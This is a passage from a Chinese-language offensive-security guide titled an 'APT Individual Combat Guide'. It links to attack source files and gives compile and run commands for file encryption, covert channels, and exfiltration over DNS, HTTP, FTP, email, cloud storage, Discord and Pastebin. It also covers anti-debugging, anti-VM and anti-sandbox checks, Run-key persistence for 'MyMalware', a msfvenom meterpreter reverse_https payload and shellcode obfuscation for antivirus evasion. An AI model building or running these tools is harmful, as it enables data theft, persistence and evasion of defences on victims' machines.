[ssh_execute.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/ssh_execute.cpp)

```bash
g++ ssh_execute.cpp -o ssh_execute -lssh2
```

## 数据窃取

### 数据加密

1. TEA加密

[TEA加密指定文件](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/TEA加密指定文件.cpp)

```bash
cl /EHsc .cpp文件
```

```bash
.exe可执行程序 加密 locale_file.txt encode_locale_file.txt 1234qwerasdfzxcv
.exe可执行程序 解密 encode_locale_file.txt decrypte_locale_file.txt 1234qwerasdfzxcv
type decrypte_locale_file.txt
```

2. Madryga加密

[madryga_encrypt.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/madryga_encrypt.cpp)

```bash
cl /EHsc madryga_encrypt.cpp
```

3. A5/1加密

[a5_1_encrypt.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/a5_1_encrypt.cpp)

```bash
cl /EHsc a5_1_encrypt.cpp
```

```bash
.\a5_1_encrypt.exe 加密 locale_file.txt encode.txt 123456789ABCDEF 1AC
.\a5_1_encrypt.exe 解密 encode.txt decrypted.txt 123456789ABCDEF 1AC
```

4. 加密目录及目录中的所有文件

[xor.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/xor.cpp)

```bash
.\xor.exe 加密 "C:\Users\snowwolf\Desktop\rat\tips\h\aes" "1234567890abcdef"
.\xor.exe 解密 "C:\Users\snowwolf\Desktop\rat\tips\h\aes" "1234567890abcdef"
```

### 隐蔽通信通道

1. 隐写术

(1)图像隐写术

[hide_image.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/hide_image.cpp)

```bash
.\hide_image.exe 隐藏 "隐藏的文件目录" "图片路径"
```

(2)数据流隐写术

[ads.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/ads.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 ads.cpp -o ads.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```bash
Get-Item -Path C:\Users\snowwolf\Desktop\rat\tips\h\snowwolf.txt -Stream *
```

2. DNS隧道

[dns.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/dns.cpp)

```bash
.\dns.exe %USERNAME%.DNSlog
```

3. HTTP隧道

[py_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/py_server.py)

[http.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/http.cpp)

```bash
python3 py_server.py
.\http.exe 攻击者IP地址 snowwolf.txt
```

4. 加密隧道

[https_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/https_server.py)

[https_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/https_client.py)

```bash
python3 https_server.py
python3 https_client.py
```

### 数据外传

1. FTP数据外传

[ftp_upload.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/ftp_upload.py)

```bash
pip3 install pyinstaller
pyinstaller --onefile ftp_upload.py
```

2. HTTP/HTTPS数据外传

```bash
apt install python3.12-venv
python3 -m venv flask
cd flask
./bin/pip3 install flask
```

[app.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/app.py)

[http_upload.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/http_upload.py)

```bash
pyinstaller --onefile http_upload.py
```

3. 电子邮件数据外传

[mail_upload.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/mail_upload.py)

```bash
pyinstaller --onefile mail_upload.py
```

4. 云存储

[cloud.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/cloud.py)

```bash
pip install baidubce oss2 qiniu qcloud_cos bce-python-sdk oss2 cos-python-sdk-v5 botocore
pyinstaller --onefile cloud.py
```

[国外云存储](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/国外云存储.py)

5. API文件上传

(1)Virus Total API文件上传

[upload_vt.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/upload_vt.py)

```bash
pyinstaller --onefile upload_vt.py
```

(2)Discord Webhook

[upload_to_discord.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/upload_to_discord.py)

```bash
pyinstaller --onefile .\upload_to_discord.py
cd dist
.\upload_to_discord.exe --command "whoami"
```

(3)Pastebin API

[pastebin.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/pastebin.py)

```bash
pyinstaller --onefile .\pastebin.py
```

## 反取证

### 反调试

1. API调用检测

[nqip.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/nqip.cpp)

2. 异常处理

[eh.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/eh.cpp)

3. 内存修改检测

[check_memory.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/check_memory.cpp)

4. 硬件断点检测

[硬件断点检测](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/硬件断点检测.cpp)

5. 全局标志集合

[ngf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/ngf.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 ngf.cpp -o ngf.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

6. 检查代码更改来检测断点

[检查代码更改来检测断点](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/检查代码更改来检测断点.cpp)

7. 通过检查内存页面权限来检测断点

[检查内存页面权限来检测断点](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/检查内存页面权限来检测断点.cpp)

8. 创建中断

[创建中断](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/创建中断.cpp)

9. 自我调试

[自我调试](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/自我调试.cpp)

10. 执行时间

[执行时间](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/执行时间.cpp)

11. 隐藏调试器

[隐藏调试器](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/隐藏调试器.cpp)

12. 执行路径

[执行路径](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/执行路径.cpp)

13. TLS回调

[TLS回调](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/TLS回调.cpp)

14. 阻止用户输入

[阻止用户输入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/阻止用户输入.cpp)

15. 系统进程

[系统进程](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E5%8F%96%E8%AF%81/系统进程.cpp)

### 反虚拟化

1. 检查特殊硬件信息

[检测系统BIOS信息](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E8%99%9A%E6%8B%9F%E5%8C%96/检测系统BIOS信息.cpp)

[检查硬盘序列号](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E8%99%9A%E6%8B%9F%E5%8C%96/检查硬盘序列号.cpp)

2. 硬件资源检测

[硬件资源检测](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E8%99%9A%E6%8B%9F%E5%8C%96/硬件资源检测.cpp)

3. MAC地址

[MAC地址](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E8%99%9A%E6%8B%9F%E5%8C%96/MAC地址.cpp)

4. 检测特定虚拟设备

[检测特定虚拟设备](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E8%99%9A%E6%8B%9F%E5%8C%96/检测特定虚拟设备.cpp)

5. VM特定工件

[VM特定工件](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E8%99%9A%E6%8B%9F%E5%8C%96/VM特定工件.cpp)

6. 检测特定文件

|  设备   | 路径  |
|  ----  | ----  |
| 常规  | c:\[60 random hex symbols]<br>c:\take_screenshot.ps1<br>c:\loaddll.exe<br>c:\email.doc<br>c:\email.htm<br>c:\123\email.doc<br>c:\123\email.docx<br>c:\a\foobar.bmp<br>c:\a\foobar.doc<br>c:\a\foobar.gif<br>c:\symbols\aagmmc.pdb |
| Parallels  | c:\windows\system32\drivers\prleth.sys<br>c:\windows\system32\drivers\prleth.sys<br>c:\windows\system32\drivers\prlmouse.sys<br>c:\windows\system32\drivers\prlvideo.sys<br>c:\windows\system32\drivers\prltime.sys<br>c:\windows\system32\drivers\prl_pv32.sys<br>c:\windows\system32\drivers\prl_paravirt_32.sys |
| VirtualBox  | c:\windows\system32\drivers\VBoxMouse.sys<br>c:\windows\system32\drivers\VBoxGuest.sys<br>c:\windows\system32\drivers\VBoxSF.sys<br>c:\windows\system32\drivers\VBoxVideo.sys<br>c:\windows\system32\vboxdisp.dll<br>c:\windows\system32\vboxhook.dll<br>c:\windows\system32\vboxmrxnp.dll<br>c:\windows\system32\vboxogl.dll<br>c:\windows\system32\vboxoglarrayspu.dll<br>c:\windows\system32\vboxoglcrutil.dll<br>c:\windows\system32\vboxoglerrorspu.dll<br>c:\windows\system32\vboxoglfeedbackspu.dll<br>c:\windows\system32\vboxoglpackspu.dll<br>c:\windows\system32\vboxoglpassthroughspu.dll<br>c:\windows\system32\vboxservice.exe<br>c:\windows\system32\vboxtray.exe<br>c:\windows\system32\VBoxControl.exe<br>%PROGRAMFILES%\oracle\virtualbox guest additions\ |
| VirtualPC  | c:\windows\system32\drivers\vmsrvc.sys<br>c:\windows\system32\drivers\vpc-s3.sys |
| VMware  | c:\windows\system32\drivers\vmmouse.sys<br>c:\windows\system32\drivers\vmnet.sys<br>c:\windows\system32\drivers\vmxnet.sys<br>c:\windows\system32\drivers\vmhgfs.sys<br>c:\windows\system32\drivers\vmx86.sys<br>c:\windows\system32\drivers\hgfs.sys<br>%PROGRAMFILES%\VMware\ |

[检测特定文件](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E8%99%9A%E6%8B%9F%E5%8C%96/检测特定文件.cpp)

7. 检查特定注册表项

|  产品   | 注册表路径  |
|  ----  | ----  |
| 常规  | HKLM\Software\Classes\Folder\shell\sandbox  |
| Hyper-V  | HKLM\SOFTWARE\Microsoft\Hyper-V<br>HKLM\SOFTWARE\Microsoft\VirtualMachine<br>HKLM\SOFTWARE\Microsoft\Virtual<br>Machine\Guest\Parameters<br>HKLM\SYSTEM\ControlSet001\Services\vmicheartbeat<br>HKLM\SYSTEM\ControlSet001\Services\vmicvss<br>HKLM\SYSTEM\ControlSet001\Services\vmicshutdown<br>HKLM\SYSTEM\ControlSet001\Services\vmicexchange  |
| Parallels  | HKLM\SYSTEM\CurrentControlSet\Enum\PCI\VEN_1AB8*  |
| Sandboxie  | HKLM\SYSTEM\CurrentControlSet\Services\SbieDrv<br>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Sandboxie  |
| VirtualBox  | HKLM\SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE*<br>HKLM\HARDWARE\ACPI\DSDT\VBOX__<br>HKLM\HARDWARE\ACPI\FADT\VBOX__<br>HKLM\HARDWARE\ACPI\RSDT\VBOX__<br>HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions<br>HKLM\SYSTEM\ControlSet001\Services\VBoxGuest<br>HKLM\SYSTEM\ControlSet001\Services\VBoxMouse<br>HKLM\SYSTEM\ControlSet001\Services\VBoxService<br>HKLM\SYSTEM\ControlSet001\Services\VBoxSF<br>HKLM\SYSTEM\ControlSet001\Services\VBoxVideo  |
| VirtualPC  | HKLM\SYSTEM\CurrentControlSet\Enum\PCI\VEN_5333*<br>HKLM\SYSTEM\ControlSet001\Services\vpcbus<br>HKLM\SYSTEM\ControlSet001\Services\vpc-s3<br>HKLM\SYSTEM\ControlSet001\Services\vpcuhub<br>HKLM\SYSTEM\ControlSet001\Services\msvmmouf  |
| VMware  | HKLM\SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD*<br>HKCU\SOFTWARE\VMware, Inc.\VMware Tools<br>HKLM\SOFTWARE\VMware, Inc.\VMware Tools<br>HKLM\SYSTEM\ControlSet001\Services\vmdebug<br>HKLM\SYSTEM\ControlSet001\Services\vmmouse<br>HKLM\SYSTEM\ControlSet001\Services\VMTools<br>HKLM\SYSTEM\ControlSet001\Services\VMMEMCTL<br>HKLM\SYSTEM\ControlSet001\Services\vmware<br>HKLM\SYSTEM\ControlSet001\Services\vmci<br>HKLM\SYSTEM\ControlSet001\Services\vmx86<br>HKLM\SYSTEM\CurrentControlSet\Enum\IDE\CdRomNECVMWar_VMware_IDE_CD*<br>HKLM\SYSTEM\CurrentControlSet\Enum\IDE\CdRomNECVMWar_VMware_SATA_CD*<br>HKLM\SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_IDE_Hard_Drive*<br>HKLM\SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_SATA_Hard_Drive*  |
| Wine  | HKCU\SOFTWARE\Wine<br>HKLM\SOFTWARE\Wine  |
| Xen  | HKLM\HARDWARE\ACPI\DSDT\xen<br>HKLM\HARDWARE\ACPI\FADT\xen<br>HKLM\HARDWARE\ACPI\RSDT\xen<br>HKLM\SYSTEM\ControlSet001\Services\xenevtchn<br>HKLM\SYSTEM\ControlSet001\Services\xennet<br>HKLM\SYSTEM\ControlSet001\Services\xennet6<br>HKLM\SYSTEM\ControlSet001\Services\xensvc<br>HKLM\SYSTEM\ControlSet001\Services\xenvdb  |

[检查特定注册表项](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E8%99%9A%E6%8B%9F%E5%8C%96/检查特定注册表项.cpp)

8. 检查特定进程

|  产品   | 进程名  |
|  ----  | ----  |
| JoeBox  | joeboxserver.exe<br>joeboxcontrol.exe  |
| Parallels  | 	prl_cc.exe<br>prl_tools.exe  |
| VirtualBox  | 	vboxservice.exe<br>vboxtray.exe  |
| VirtualPC  | vmsrvc.exe<br>vmusrvc.exe  |
| VMware  | 	vmtoolsd.exe<br>vmacthlp.exe<br>vmwaretray.exe<br>vmwareuser.exe<br>vmware.exe<br>vmount2.exe  |
| Xen  | xenservice.exe<br>xsvc_depriv.exe  |
| WPE Pro  | 	WPE Pro.exe  |

[检查特定进程](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E8%99%9A%E6%8B%9F%E5%8C%96/检查特定进程.cpp)

### 反沙箱

1. 检测硬件资源

[检测硬件资源](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/检测硬件资源.cpp)

2. 应用程序名称和目录

[应用程序名称和目录](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/应用程序名称和目录.cpp)

3. 指定父进程

[指定父进程](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/指定父进程.cpp)

4. 已加载库

[已加载库](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/已加载库.cpp)

5. 窗口名称

[窗口名称](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/窗口名称.cpp)

6. 用户名、计算机名或域

[用户名、计算机名或域](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/用户名、计算机名或域.cpp)

7. 屏幕分辨率

[屏幕分辨率](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/屏幕分辨率.cpp)

8. USB存储记录

[USB存储记录](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/USB存储记录.cpp)

9. 时区

[时区](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/时区.cpp)

10. 互联网连接

[互联网连接](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/互联网连接.cpp)

[特定响应](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/特定响应.cpp)

11. 用户交互

[用户交互](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/用户交互.cpp)

12. 鼠标移动距离

[鼠标移动距离](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/鼠标移动距离.cpp)

13. 先前用户交互记录

[先前用户交互记录](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/先前用户交互记录.cpp)

14. 进程数

[进程数](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/进程数.cpp)

15. 运行时间

[运行时间](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/运行时间.cpp)

16. 延迟执行

[延迟执行](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/延迟执行.cpp)

17. 内核用户共享数据

[内核用户共享数据](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/内核用户共享数据.cpp)

18. 检查和解除挂钩

[检查和解除挂钩](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/检查和解除挂钩.cpp)

[检测函数挂钩并修复](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/检测函数挂钩并修复.cpp)

19. 直接系统调用

[直接系统调用](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E6%B2%99%E7%AE%B1/直接系统调用.cpp)

### 反静态

1. 反反汇编

```asm
section .text
global _start

_start:
    db 0xE8, 0x00, 0x00, 0x00, 0x00  ; 调用下一条指令
    ret                              ; 返回地址为0x1，混淆控制流
```

2. C运行时库

```c
#define _NO_CRT_STDIO_INLINE
#include <windows.h>
#include <stdio.h>

// 示例函数
void run() {
    MessageBoxA(NULL, "Static CRT Library Example", "Hello", MB_OK);
}

int main() {
    run();
    return 0;
}
```

3. 代码优化

```c
#include <windows.h>
#include <stdio.h>

// 强制内联函数
__forceinline void inlineFunction() {
    MessageBoxA(NULL, "Inline Function", "Hello", MB_OK);
}

void run() {
    inlineFunction();
    printf("Running optimized code...\n");
}

int main() {
    run();
    return 0;
}
```

4. 调试信息

```c
#include <windows.h>
#include <stdio.h>

// 示例函数
void run() {
    MessageBoxA(NULL, "No Debug Info", "Hello", MB_OK);
}

int main() {
    run();
    return 0;
}
```

5. 更改文件HASH值

[复制可执行文件](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/复制可执行文件.cpp)

[复制可执行文件更改注册表](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/复制可执行文件更改注册表.cpp)

```c
// 确保下次运行的是 newExecutablePath - 修改注册表持久化条目
HKEY hKey;
if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
    RegSetValueEx(hKey, L"MyMalware", 0, REG_SZ, (BYTE*)newExecutablePath, (lstrlen(newExecutablePath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
}
```

6. 隐藏导入地址表

shellcode:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.189 LPORT=4444 -f c
```

[隐藏导入地址表](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/隐藏导入地址表.cpp)

7. API哈希

[API哈希](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/API哈希.cpp)

8. 引导Shellcode

[引导Shellcode](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/引导Shellcode.cpp)

## 免杀规避

### XOR加密和解密Shellcode

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Xor' TITLE='Ghost Wolf Lab' -f raw -o xor.bin
```

[xor.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/xor.cpp)

[xor.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/xor.py)

```bash
python3 xor.py
x86_64-w64-mingw32-gcc xor.cpp -o xor.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc >/dev/null 2>&1
```

### 函数调用混淆

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Hide Function' TITLE='Ghost Wolf Lab' -f csharp
```

[hide_function.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/hide_function.cpp)

[hide_function.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/hide_function.py)

```bash
python3 hide_function.py
x86_64-w64-mingw32-gcc hide_function.cpp -o hide_function.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc >/dev/null 2>&1
```

### 分配和填充大量内存

[100MB.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/100MB.cpp)

```bash
